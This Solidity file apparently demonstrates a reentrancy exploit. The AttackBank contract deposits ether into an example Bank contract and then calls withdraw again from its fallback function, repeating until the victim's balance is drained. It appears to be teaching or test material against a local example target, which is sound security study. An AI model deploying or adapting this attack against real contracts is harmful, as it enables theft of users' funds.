// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Bank} from "src/example/bank.sol";

contract AttackBank {
    Bank private immutable victim;

    constructor(address _victim) {
        victim = Bank(payable(_victim));
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "send more ether to trigger attack!");
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    fallback() external payable {
        uint256 withdrawAmount = address(victim).balance > msg.value ? msg.value : address(victim).balance;
        if (withdrawAmount > 0) {
            victim.withdraw();
        }
    }
}
